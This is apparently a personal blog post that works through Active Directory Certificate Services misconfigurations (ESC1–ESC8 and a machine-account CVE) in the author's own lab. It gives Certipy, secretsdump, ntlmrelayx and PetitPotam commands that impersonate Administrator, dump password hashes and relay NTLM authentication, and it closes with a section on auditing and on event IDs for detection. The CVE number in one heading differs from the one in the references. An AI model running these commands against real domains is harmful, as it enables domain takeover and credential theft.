Although this is nothing new, these days I wanted to read and learn in depth how Active Directory Certificate Services works. For this purpose, I configured the ADCS, the CA and the vulnerable templates in my lab, replicating each of the cases shown in the awesome [SpecterOps ADCS](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf) whitepaper , in addition to other resources which I will refer to through this post.

First of all, we will see **what is Active Directory Certificate Services** and **what is a certificate templates**. Then **how to enumerate these templates**, and the different **misconfigurations that we can use in order to escalate privileges** within the domain, and finally the **events that our actions against this service can generate.**

---
<h2 align="center" id="index">Index</h2>
---

- [Active Directory Certification Services](#heading)
- [Certificate Templates](#heading2)
- [Enumeration](#heading3)
- [ESC1: Misconfigured Certificate Templates Allows requesters to specify a SA](#heading4)
- [ESC2: Certificate template can be used for any purpose](#heading5)
- [ESC3: Misconfigured Enrollment Agent Templates](#heading6)
- [ESC4: Vulnerable Certificate Template Access Control](#heading7)
- [ESC5: Vulnerable PKI Object Access Control](#heading8)
- [ESC6: CA has EDIT_ATTRIBUTESUBJECTALTNAME2 flag set](#heading9)
- [ESC7: Vulnerable Certificate Authority Access Control](#heading10)
- [ESC8: NTLM Relay to AD CS HTTP Endpoints](#heading11)
- [CVE-2022-29623](#heading12)
- [Audit Certification Services](#heading14)
- [References](#heading13)

<br>

---
<h2 align="center" id="heading">Active Directory Certification Services</h2>
---

<br>

Active Directory Certificate Services ( AD CS for the rest of the post), as per Microsoft, is a “**Server Role** that enables you to construct public key infrastructure (PKI) and give open key cryptography, computerized authentication, and advanced mark abilities for your association.”


This server Role, was introduced in Windows Server 2008, It is not installed by default, but is widely used.
It is not easy to perform a correct configuration, so may be encountered environments with serious misconfigurations.


To understand this implementation of Public Key Infrastructure within Active Directory, it is important to know some concepts:


* **PKI** (Public Key Infrastructure) — a system to manage certificates/public key encryption.
* **PKINIT** - Public Key Cryptography for Initial Authentication in Kerberos Protocol.
* **AD CS** (Active Directory Certificate Services) — Microsoft’s PKI implementation.
* **CA** (Certificate Authority) — PKI server that issues certificates.
* **Enterprise CA** — CA integrated with AD (as opposed to a standalone CA), offers certificate templates.
* **Certificate Template** — a collection of settings and policies that defines the contents of a certificate issued by an enterprise CA.
* **CSR** (Certificate Signing Request) — a message sent to a CA to request a signed certificate.
* **EKU** (Extended/Enhanced Key Usage) — one or more object identifiers (OIDs) that define how a certificate can be used.


![ADCSXMind](https://gitlab.com/RayRT/rayrt.gitlab.io/-/raw/main/assets/1ADCS.png)
<a name="CT"></a>

<br>

---
<h2 align="center" id="heading2">Certificate Templates</h2>
---

<br>                                         
                                               
All Enterprise CA servers issue certificates based on one or more of the certificate templates. You cannot create a new template from scratch.
There is only one set of templates, and they are stored in Active Directory for the entire forest. Each Enterprise CA server in the forest uses the same set of templates, regardless of domain or subdomain membership. However, this doesn’t mean you have to enable the same set of templates on all Enterprise CA servers. Instead, you can enable different templates on each Enterprise CA server.

But, what is a certificate template?. **The certificates templates are just collections of enrollment policies and predefined certificate settings.**

In a template you can define things like:
* Validity/ Renewal period
* Who can request a certificate? For whom?
* What actions can be carried out with this certificate?
* How is the subject specified?
* …

An example of certificate template from the windows Certificate Templates Console (certtmlp.msc):


![ADCSXMind](https://gitlab.com/RayRT/rayrt.gitlab.io/-/raw/main/assets/CertiTemplate1.png)


Performing a correct configuration, not only on the own CA, also of the properties that define each template is not a easy task, so it is likely to encounter misconfigurations.

In the whitepaper of SpecterOps, we not only find how to abuse these misconfigurations, but also how to steal the certificates and how to use them in order to create persistence in the domain, but in this post i wanted to focus on the abuse cases and learn how to configure in my environment each of the misconfigurations to understand them in depth.

<br>

---
<h2 align="center" id="heading3">AD CS Enumeration</h2>
---

<br>  

 The following are the basic attributes to look for in order to find misconfigurations in the certificates templates:

```
     Value                            Definition
     
pkicertificatetemplate        -->  	   Specify the template’s schema version
mspki-enrollment-flag         -->  	   Specifies enrollment flags (https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-crtd/ec71fd43-61c2-407b-83c9-b52272dec8a1)
mspki-ra-signature            -->  	   Specifies the number of enrollment registration authority signatures that are required in an enrollment request
mspki-certificate-name-flag    -->  	   Specifies the subject name flags (https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-crtd/1192823c-d839-4bc3-9b6b-fa8c53507ae1)
```

It is also important to know the Object identifiers (OIDs) that describe how the certificate will be used:
 
```
Usages (EKUs - pkiextendedkeyusage Attribute) : 

     Value                      Definition

1.3.6.1.5.5.7.3.3        -->  	Code Signing                                             
1.3.6.1.4.1.311.10.3.4   -->   	Encrypting File System                                   
1.3.6.1.5.5.7.3.4        -->   	Encrypting Mail                                          
1.3.6.1.4.1.311.20.2.2   -->   	Smart Card Logon                                         
1.3.6.1.5.5.7.3.2        -->    Authentication to another server                         
1.3.6.1.5.2.3.4          -->   	PKINIT Client Authentication (Needs to be added manually)
1.3.6.1.5.5.7.3          -->   	Server Authentication (Identifying servers)              					
2.5.29.37.0              -->   	Any Porpuse                                              
```

Below, a example of LDAP query to enumerate certificate templates that **do not requiere approval/signatures (mspki-enrollment-
flag & mspki-ra-signature)**, that have a **Client Authentication or Smart Card Logon EKU (pkiextendedkeyusage)** and have the **CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT flag enabled (certificate-name-flag)**.

```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollment-
flag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-ra-
signature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextend
edkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)
(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspki-
certificate-name-flag:1.2.840.113556.1.4.804:=1))

```

Certificate template with the Authentication EKU from GUI:

![ADCSXMind](https://gitlab.com/RayRT/rayrt.gitlab.io/-/raw/main/assets/ekus.png)


You can use **certutil** to dump and display certification authority (CA) configuration information, configure Certificate Services, backup and restore CA components, and verify certificates, key pairs, and certificate chains:

![ADCSXMind](https://gitlab.com/RayRT/rayrt.gitlab.io/-/raw/main/assets/certutil1.png)

Example of available certificates templates using certutil (you can search for a specific template with **-template "TemplateName"**):

![ADCSXMind](https://gitlab.com/RayRT/rayrt.gitlab.io/-/raw/main/assets/certutil2.png)


Alternatively, we have the **Certify** tool, a C# tool for enumerating and abusing misconfigurations in ADCS:

![ADCSXMind](https://gitlab.com/RayRT/rayrt.gitlab.io/-/raw/main/assets/certifyFind.png)

Also, we have **Certipy**, the python implementation of Certify. In this post we will focus on this tool. 

**Certipy** can help us quickly enumerate certificate templates, certificate authorities and other configurations, we can export the output in different formats, it is useful to be able to import the results directly into bloodhound (You will need to add [Certipy custom queries](https://raw.githubusercontent.com/ly4k/Certipy/main/customqueries.json):

```
certipy find 'EvilCorp.local/TheHorseman:EvilCorp3.@EVILDC1' -bloodhound
```

Example of how custom queries looks in BloodHound:
![ADCSXMind](https://gitlab.com/RayRT/rayrt.gitlab.io/-/raw/main/assets/CustomQuery1.png)

And an example of an specific certificate template and its attributes:
![ADCSXMind](https://gitlab.com/RayRT/rayrt.gitlab.io/-/raw/main/assets/CustomQuery2.png)



Another good tool is [certi](https://github.com/zer1t0/certi) from [@eloypgz](https://eloypgz.org/posts/):

```
python3 certi.py list 'EvilCorp.local/TheHorseman:EvilCorp3.' -k --dc-ip EVILDC1 --vuln --enable | grep ESC1 -B 3 :

Name: SubCA
Schema Version: 1
Enroll Services: EvilCorp-EVILDC1-CA
Vulnerabilities: ESC1 - SAN Impersonation, ESC2 - Any Purpose, ESC3.2 - Use Agent Certificate
--
      S-1-5-21-789939560-103138351-2482480773-512 EvilCorp\Domain Admins
      S-1-5-21-789939560-103138351-2482480773-519 EvilCorp\Enterprise Admins

Name: Vulnerable ESC1
Schema Version: 2
Enroll Services: EvilCorp-EVILDC1-CA
Vulnerabilities: ESC1 - SAN Impersonation

```

Below, you will find the different cases of misconfigurations and how to exploit them in order to escalate privileges within the AD environment:

![ADCSXMind](https://gitlab.com/RayRT/rayrt.gitlab.io/-/raw/main/assets/xmindESC.png)

<br>

---
<h2 align="center" id="heading4">ESC1: Misconfigured Certificate Templates Allows requesters to specify a SAN</h2>
---

<br>

In order to be able to abuse this configuration, a series of requirements are needed, before listing them, it is important to define what the SAN is:
**Subject  Alternative  Name  (SAN)  is  an  extension  to  X.509  that  allows various identities to be bound to a certificate beyond the subject**.

By default during certificate-based authentication, certificates are mapped to Active Directory accounts based on a user principal name (UPN) specified in the SAN;
So, **when a certificate template allows requester to specify a SAN, it is possible to request a certificate for another user**.

It can be used for privileges escalation if the certificate template defines EKUs that enable domain authentication and can be enrolled by non- privileged user without manager approval.
The certificate template’s AD object specifies if the requester can specify the SAN in its mspki-certificate-name-flag property. The mspki-certificate-name-flag property is a bitmask and if the CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT flag is present, a requester can specify the SAN:


![ADCSXMind](https://gitlab.com/RayRT/rayrt.gitlab.io/-/raw/main/assets/ESC1.png)

* In addition, it is necessary that the enterprise CA's configuration must allow low privileged users the ability to request certificates. 
* That the Approval Manager is disabled.
* Authorized signatures are not required.
* Have certificate enrollment rights that allow a low-privileged attacker to request and obtain a certificate based on the template.

**How to abuse:**

* We can request a certificate based on the vulnerable certificate template and specify an arbitrary SAN:

```

 certipy req 'EVILCORP/TheHorseman:EvilCorp3.@EVILDC1.EvilCorp.local' -ca 'EvilCorp-EVILDC1-CA' -template 'Vulnerable ESC1' -alt 'Administrator@EvilCorp.local'

```

 Then, all we need is to authenticate with our .pfx with the **auth** flag and we will obtain the hash of the requested user (**The NT hash will be extracted by using Kerberos U2U to request a TGS for the current user, where the encrypted PAC will contain the NT hash, which can be decrypted**): 

```
 
 certipy auth -pfx administrator.pfx
 
```

```

 secretsdump.py -hashes :669556eda1adbb10afdf29f42760db39 Administrator@EVILDC1.evilcorp.local -just-dc-user krbtgt
 
```

<br>

---
<h2 align="center" id="heading5">ESC2: Certificate template can be used for any purpose</h2>
---

<br>

In this case, the same requirements are needed as in ESC1, but with the variant that **the template specifies the EKU Any Purpose, or no EKU, the certificate can be used for anything.**
It can be abused in other ways, such as code signing, server authentication, or in the same way we will see in ESC3, to request another certificate on behalf of any other user.

Requirements:

* The Enterprise CA grants low-privileged users enrollment rights. Details are the same as in ESC1.
* No manager approval.
* No authorized signatures are required. 
* An overly permissive certificate template security descriptor grants certificate enrollment rights to low-privileged users.
* The certificate template defines the Any Purpose EKU or no EKU

![ADCSXMind](https://gitlab.com/RayRT/rayrt.gitlab.io/-/raw/main/assets/ESC2.png)


**How to abuse:**

1. If the requester can specify a SAN, ESC2 vulnerable certificate can be abused like ESC1:

```

certipy req 'EVILCORP/TheHorseman:EvilCorp3.@EVILDC1.EvilCorp.local' -ca 'EvilCorp-EVILDC1-CA' -template 'Vulnerable ESC2' -alt 'Administrator@EvilCorp.local'
 
```

2. It can be abused like ESC3 (See below) – the ESC2 vulnerable certificate can be used to request another one on behalf of any other user:

Request a certificate based on the vulnerable certificate template ESC3:

```

certipy req 'EvilCorp/TheHorseman:EvilCorp3.@EVILDC1.EvilCorp.local' -ca 'EvilCorp-EVILDC1-CA' -template 'Vulnerable ESC3'
 
```

Now, we can then use the Certificate Request Agent certificate (-pfx) to request a certificate on behalf of other another user:
 
 
```

certipy req 'EvilCorp/TheHorseman:EvilCorp3.@EVILDC1.EvilCorp.local' -ca 'EvilCorp-EVILDC1-CA' -template 'ESC3C2' -on-behalf-of 'EvilCorp\Administrator' -pfx 'thehorseman.pfx'
 
```

<br>

---
<h2 align="center" id="heading6">ESC3: Misconfigured Enrollment Agent Templates</h2>
---

<br>

For this case, we need to know what Enrollment Agents are, they are users who can enroll a certificate on behalf of another user.
The issued certificate from ESC3 vulnerable template allows to request another certificate on behalf of any user (it means that it is possible to impersonate any user). This is because the the certificate template defines the Certificate Request Agent EKU. The CertificateRequest Agent OID (1.3.6.1.4.1.311.20.2.1) allows for requesting other certificatetemplates on behalf of other principals.

Also, in order to abuse this misconfiguration, a CAs requires at least two templates matching this requirements:
 Condition 1 :
  *  A template allows a low-privileged user to enroll in an enrollment agent certificate
  *  That the Approval Manager is disabled.
  *  Authorized signatures are not required.
  *  The certificate template defines the Certificate Request Agent EKU. The Certificate Request Agent OID (1.3.6.1.4.1.311.20.2.1) allows for requesting other certificate templates on behalf of other principals.

Example of a template that matches Condition 1:

![ADCSXMind](https://gitlab.com/RayRT/rayrt.gitlab.io/-/raw/main/assets/ESC3.png)

  Condition 2 :
  * Another template permits a low privileged user to use the enrollment agent certificate to request a certificate on behalf of another user, and the template defines an EKU that allows for domain authentication.
  * Manager approval is disabled.
  * The template schema version 1 or is greater than 2 and specifies an Application Policy Issuance Requirement requiring the Certificate Request Agent EKU.
  * The certificate template defines an EKU that allows for domain authentication.
  * Enrollment agent restrictions are not implemented on the CA.

Example of a template that matches Condition 2:

![ADCSXMind](https://gitlab.com/RayRT/rayrt.gitlab.io/-/raw/main/assets/ESC3C2.png)

**How to abuse:**

Request a certificate based on the vulnerable certificate template ESC3:

```

certipy req 'EvilCorp/TheHorseman:EvilCorp3.@EVILDC1.EvilCorp.local' -ca 'EvilCorp-EVILDC1-CA' -template 'Vulnerable ESC3'
 
```

Now, we can then use the Certificate Request Agent certificate (-pfx) to request a certificate on behalf of other another user:
 
```

certipy req 'EvilCorp/TheHorseman:EvilCorp3.@EVILDC1.EvilCorp.local' -ca 'EvilCorp-EVILDC1-CA' -template 'ESC3C2' -on-behalf-of 'EvilCorp\Administrator' -pfx 'thehorseman.pfx'
 
```

<br>

---
<h2 align="center" id="heading7">ESC4: Vulnerable Certificate Template Access Control</h2>
---

<br>

Certificates templates are AD objects, so they have security descriptor, that defines which permissiones AD principals have over the template
Weak permissions (Excessive Access rights) can allow non-privileged users to edit sensitive security settings in the template ( defines EKUs, allows SAN, disable manager approval), thereby making its vulnerable to the ESC1-3 technique.

ACLS: The rights we care about are:

![ADCSXMind](https://gitlab.com/RayRT/rayrt.gitlab.io/-/raw/main/assets/ACLS4.png)


Example of certifcate template with overly permissive ACLs:

![ADCSXMind](https://gitlab.com/RayRT/rayrt.gitlab.io/-/raw/main/assets/ESC4.png)


**How to abuse:**

Let's see an example of template for ESC4, in which we can see that manager approval and authorized signatures are required, also we can see which users have permissions over the template:

![ADCSXMind](https://gitlab.com/RayRT/rayrt.gitlab.io/-/raw/main/assets/ESC4PRE.png)

With the following command, Certipy will save the initial configuration of the certificate so that it can be restored later, and it will also modify the template configuration, which will make it vulnerable to ESC1.


```

certipy template 'EvilCorp/TheHorseman:EvilCorp3.@EVILDC1.EvilCorp.local' -template 'Vulnerable ESC4' -save-old

```

We can see below that it has been successfully modified:

![ADCSXMind](https://gitlab.com/RayRT/rayrt.gitlab.io/-/raw/main/assets/ESC4POST.png)

The certificate template is now vulnerable to the ESC1 technique.
Therefore, we can now request a certificate based on the ESC4 template and specify a SAN:

```

certipy req 'EvilCorp/TheHorseman:EvilCorp3.@EVILDC1.EvilCorp.local' -ca 'EvilCorp-EVILDC1-CA' -template 'Vulnerable ESC4' -alt 'Administrator@EvilCorp.local'

```

Now, we can restore the old configuration:

```

certipy template 'EvilCorp/TheHorseman:EvilCorp3.@EVILDC1.EvilCorp.local' -template 'Vulnerable ESC4' -configuration 'Vulnerable ESC4.json'

```

<br>

---
<h2 align="center" id="heading8">ESC5: Vulnerable PKI Object Access Control</h2>
---

<br>

Several objects outside of certificate templates and the certificate authority itself can have a security impact on the entire AD CS system:

* The CA server’s AD computer object 
* The CA server’s RPC/DCOM server
* Any descendant AD object or container in the container CN=Public Key Services, CN=Services, CN=Configuration, DC=demo, DC=local (e.g., the Certificate Templates container, Certification Authorities container, the NTAuthCertificates object, the Enrollment Services Container, etc…)
* If a low-privileged attacker can gain control over any of these, the attack can likely compromise the PKI system. 

In case of gaining control over the NTAuthCertificates object, a CA certificates could be generated and added to this object, take a look [ForgeCert](https://github.com/GhostPack/ForgeCert) tool from Benjamin Delpy.

<br>

---
<h2 align="center" id="heading9">ESC6: CA has EDIT_ATTRIBUTESUBJECTALTNAME2 flag set</h2>
---

<br>

If EDITF_ATTRIBUTESUBJECTALTNAME2 flag is enabled on an enterprise CA, alternative names are allowed for any certificate templates, regardless of templates' restrictions itself. Microsoft strongly not to enable this flag on an Enterprise CA:

*It is strongly recommended not to enable the EDITF_ATTRIBUTESUBJECALTNAME2 flag on an enterprise CA. If this is enabled, alternative names are allowed for any Certificate Template issued, regardless of how the subject of the certificate is determined according to the Certificate Template. Using this feature, a malicious user could easily generate a certificate with an alternative name that would allow them to impersonate another user. For example, depending on the issuance requirements, it may be possible for a malicious user to request a new certificate valid for smart card logon and request a SAN which contains the UPN of a different user. Since smart card logon uses UPN mapping by default to map a certificate to a user account, the certificate could be used to log on interactively as a different user, which could be a domain administrator or other VIP account. If this flag is enabled, the CA should be limited to require Certificate Manager approval or limit enrollment permissions to only trusted accounts.*

We can check if this setting is enabled using the following command (since this just is using remote registry, it could also be queried with reg query):

```

certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"

```

![ADCSXMind](https://gitlab.com/RayRT/rayrt.gitlab.io/-/raw/main/assets/ESC6.png)


**How to abuse:**

Almost the same as the ESC1, but here you can choose any certificate template that permits client authentication:

```

certipy req 'EvilCorp.local/TheHorseman:EvilCorp3.@EVILDC1.EvilCorp.local' -ca 'EvilCorp-EVILDC1-CA' -template 'User' -alt 'Administrator@EvilCorp.local'

```

<br>

---
<h2 align="center" id="heading10">ESC7: Vulnerable Certificate Authority Access Control</h2>
---

<br>

Outside of certificate templates, a certificate authority itself has a set of permissions that secure various CA actions:

![ADCSXMind](https://gitlab.com/RayRT/rayrt.gitlab.io/-/raw/main/assets/ESC7.png)


From the security perspective it is necessary to care about the Manage CA (aka “CA Administrator”) and Manage Certificates (aka “Certificate Officer”) permissions.


**How to abuse:**

In case we only have one user with **Manage CA** permission, it will be necessary to add us as **Officer**, which will grant us the **Manage Certificates** permission:

```

certipy ca 'EvilCorp.local/MCUser:EvilCorp3.@EVILDC1.EvilCorp.local' -ca 'EvilCorp-EVILDC1-CA' -add-officer 'MCUser'

```

Next we enable the SubCa template (enabled by default):

```

certipy ca 'EvilCorp.local/MCUser:EvilCorp3.@EVILDC1.EvilCorp.local' -ca 'EvilCorp-EVILDC1-CA' -enable-template 'SubCA'

```

Once we have enabled the SubCa template, and we have the Manager Ca and Manage Certificates permissions, we try to request a certificate based on the SubCA template:

```

certipy req 'EvilCorp.local/MCUser:EvilCorp3.@EVILDC1.EvilCorp.local' -ca 'EvilCorp-EVILDC1-CA' -template 'SubCA' -alt 'administrator@EvilCorp.local'

```

This request will be denied, just save the private key and the request ID.
With this, we can issue the failed certificate request:

```

certipy ca 'EvilCorp.local/MCUser:EvilCorp3.@EVILDC1.EvilCorp.local' -ca 'EvilCorp-EVILDC1-CA' -issue-request 674

```

And finally, retrieve the issued certificate:

```

certipy req 'EvilCorp.local/MCUser:EvilCorp3.@EVILDC1.EvilCorp.local' -ca 'EvilCorp-EVILDC1-CA' -retrieve 674 

```

<br>

---
<h2 align="center" id="heading11">ESC8: NTLM Relay to AD CS HTTP Endpoints</h2>
---

<br>

AD CS supports several HTTP-based enrollment methods if additional server roles are installed (Certificate enrollment web service):

![ADCSXMind](https://gitlab.com/RayRT/rayrt.gitlab.io/-/raw/main/assets/WebEnrollmentRelay.png)

**How to abuse:**

NOTE:

As Dirk-jan comments in his post [NTLM relaying to AD CS](https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/) the template that can be used depends on the account that is relayed. For a member server or workstation, the template would be “Computer”. For Domain Controllers this template gives an error because a DC is not a regular server and is not a member of “Domain Computers”. So if you’re relaying a DC then the template should be “DomainController” to match

We can do it directly with Certipy, or also with the implementation of AD CS attack in ntlmrelayx.py by ExAndroidDev:

```
certipy relay -ca 192.168.217.145

python ntlmrelayx.py -t http://EvilCorp-EVILDC1-CA/certsrv/csertfnsh.asp -smb2support --adcs --template 'Domain Controller'

```
Then, all we need is run PetitPotam or dementor for example, to coerce authentication:

```

python3 PetitPotam -d EvilCorp.local -u TheHorseman -p EvilCorp3. 192.168.217.145 EVILDC1

```

<br>

---
<h2 align="center" id="heading12">CVE-2022-29623</h2>
---

<br>

An attacker/user that has the ability to create a machine account and tamper with the dNSHostName attribute to mimic any machine on the domain can abuse Active Directory Certificate Services to request for a certificate as that machine that has been mimicked. In essence if an attacker creates a machine account and manipulates the dNSHostName to that of the Domain Controller, when a certificate is requested as that newly created machine account it will receive a certificate with the authorization as the Domain Controller. This can then be used to get sensitive information from the Domain Controller and eventually full Domain Admin access.

**How to abuse:**

The first step is create a new machine account with the dNSHostName principle as that of the Domain Controller. We can do this directly using certipy:

```

certipy account create 'EVILCORP/Administrator:EvilCorp1.@EVILDC1.EvilCorp.local' -user 'evilMachine1' -dns 'EVILDC1.EvilCorp.local'

```
Now, request a certificate for the fake machine account and since its dNSHostName value is set to that of the Domain Controller we will get a certificate that has the authentication corresponding to that of the Domain Controller:

```

certipy req 'EvilCorp.local/evil1$:2XrkXdyexxLLyULM@EvilCorp.local' -ca 'EvilCorp-EVILDC1-CA' -template 'Vulnerable ESC1'

```
After this, you can use the auth flag to perform again the UnPac the hash to retrieve the NTLM hash for the Domain Controller machine account.

<br>

---
<h2 align="center" id="heading14">Audit Certification Services</h2>
---

<br>

We have seen how to abuse misconfigurations in the certificates templates, but I also wanted to learn about as attackers, the different events that we can generate during the process. For this part I found an awesome talk that I totally recommend:

[Hunting for Active Directory Certificate Services Abuse](https://speakerdeck.com/heirhabarov/hunting-for-active-directory-certificate-services-abuse)

Detecting misconfigurations, modifications, requests and bad practices in certificate services can be an complex task, because the amount of legitimate events generated can be huge, this may cause us to skip  true positives that may indicate malicious use of these services...

In order to be able to monitor the different events that the certificate service could generate, it is necessary to **enable Active Directory Certificate Services (ADCS) advanced audit** :

* The first step is to configure, through certutil.exe or the Certification Authority MMC (certsrv.msc), the Certification Authority Audit Filter:

```

certutil -setreg CA AuditFilter 127

```
* Restart the certification services:

```
net stop certsvc && net start certsvc

```

* Configure Audit Certification Services either, local or domain Group Policy under **Computer Configuration\Policies\Windows Settings\Security Settings\Advanced Audit Policy Configuration\Audit Policies\Audit Certification Services**:

![ADCSXMind](https://gitlab.com/RayRT/rayrt.gitlab.io/-/raw/main/assets/enableAuditPolicy.png)

* In addition, audit subcategory processing must be **enabled** under: **Computer Configuration\Policies\Windows Settings\Security Settings\Local Policies\Security Options\Audit**: Force audit policy subcategory settings:

![ADCSXMind](https://gitlab.com/RayRT/rayrt.gitlab.io/-/raw/main/assets/enableAuditPolicy2.png)

It is also important to **specify the events to be monitored in the CA properties:**

![ADCSXMind](https://gitlab.com/RayRT/rayrt.gitlab.io/-/raw/main/assets/auditCA.png)

After these configurations, we can monitor the Certificate Services events. The most relevants ones are shown below:

* **Event 4898** -> Certificate Services loaded a template.

This event contains all necessary information about certificate templates:

![ADCSXMind](https://gitlab.com/RayRT/rayrt.gitlab.io/-/raw/main/assets/event4898.png)

* **Event 4886** -> Certificate Services received a certificate request. 

No information about templates or request parameters, a lot of alse positives, practically useless from detection point of view:

![ADCSXMind](https://gitlab.com/RayRT/rayrt.gitlab.io/-/raw/main/assets/event4886.png)

* **Event 4887** -> Certificate Sercices approved a certificate request and issued a certificate. 

This event logged when a certificate is issued as a result of either:
     - An administrator or certificate manager issues a pending request.
     - The CA automatically approves the request based on the CA's policy and that of the certificate template associated with the request.

![ADCSXMind](https://gitlab.com/RayRT/rayrt.gitlab.io/-/raw/main/assets/event4887.png)

* **Event 4890** -> The certificate manager settings for Certificate Services changed:

![ADCSXMind](https://gitlab.com/RayRT/rayrt.gitlab.io/-/raw/main/assets/event4890.png)

* **Event 4882** -> Certificate Services security permissions change:

![ADCSXMind](https://gitlab.com/RayRT/rayrt.gitlab.io/-/raw/main/assets/event4882.png)

* **Other events to monitor**, from the [Microsoft Documentation](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/dn786423(v=ws.11))

<br>

---
<h2 align="center" id="heading13">References</h2>
---

<br>


**Posts and talks:**


* [Certified Pre-Owned - SpecterOps](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)
* [Hunting for AD CS abuse](
https://speakerdeck.com/heirhabarov/hunting-for-active-directory-certificate-services-abuse)
* [AD CS ESC7-Attack](https://www.tarlogic.com/blog/ad-cs-esc7-attack/)
* [AD CS Manage CA-RCE](https://www.tarlogic.com/blog/ad-cs-manageca-rce/)
* [NTLM Relaying to AD CS](https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/)
* [ABUSING CVE-2022-26923](https://macrosec.tech/index.php/2022/06/01/abusing-cve-2022-26923-through-socks5-on-a-mythic-c2-agent/)

<br>


**Tools:**


* [Certipy](https://github.com/ly4k/Certipy)
* [Certify](https://github.com/GhostPack/Certify)
* [Certi](https://github.com/zer1t0/certi)


